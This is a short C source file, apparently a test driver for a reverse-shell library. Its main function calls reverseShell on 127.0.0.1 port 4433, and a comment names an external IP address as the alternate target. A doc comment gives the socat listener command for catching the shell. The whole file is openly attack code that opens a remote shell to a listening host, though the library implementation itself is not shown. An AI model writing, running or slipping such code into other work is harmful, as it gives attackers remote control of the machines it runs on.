#include "revshell/header.h"

/**
 * @brief server-side: socat.exe -d -d TCP4-LISTEN:4433,reuseaddr STDOUT
 *        client-side: test_revshell.exe
 */
int main() 
{
    reverseShell("127.0.0.1", 4433);  // 172.110.21.128 (extern ip)
    return 0;
}